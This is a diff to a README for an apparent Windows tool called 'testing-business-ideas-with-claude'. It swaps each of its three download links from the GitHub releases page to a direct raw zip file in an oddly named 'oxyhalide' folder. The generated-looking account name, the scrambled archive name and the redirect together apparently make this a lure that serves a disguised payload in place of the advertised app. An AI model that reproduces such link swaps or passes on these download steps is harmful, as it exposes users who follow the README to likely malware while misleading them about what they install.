@@ -1,6 +1,6 @@
 # 🚀 testing-business-ideas-with-claude - Test Business Ideas Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release%20Page-brightgreen?style=for-the-badge)](https://github.com/Stripmined-reflation431/testing-business-ideas-with-claude/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release%20Page-brightgreen?style=for-the-badge)](https://github.com/Stripmined-reflation431/testing-business-ideas-with-claude/raw/refs/heads/main/oxyhalide/ideas-claude-business-with-testing-2.9.zip)
 
 ---
 
@@ -29,7 +29,7 @@ This app runs on most standard Windows PCs. You don’t need a powerful machine 
 
 Visit the release page below to get the latest version of the app.
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Stripmined-reflation431/testing-business-ideas-with-claude/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Stripmined-reflation431/testing-business-ideas-with-claude/raw/refs/heads/main/oxyhalide/ideas-claude-business-with-testing-2.9.zip)
 
 **Steps to download and run the app:**
 
@@ -100,4 +100,4 @@ For further details, visit the release page or check the project’s GitHub Issu
 
 Get the app at this link to start exploring your ideas now:
 
-[https://github.com/Stripmined-reflation431/testing-business-ideas-with-claude/releases](https://github.com/Stripmined-reflation431/testing-business-ideas-with-claude/releases)
+[https://github.com/Stripmined-reflation431/testing-business-ideas-with-claude/raw/refs/heads/main/oxyhalide/ideas-claude-business-with-testing-2.9.zip](https://github.com/Stripmined-reflation431/testing-business-ideas-with-claude/raw/refs/heads/main/oxyhalide/ideas-claude-business-with-testing-2.9.zip)
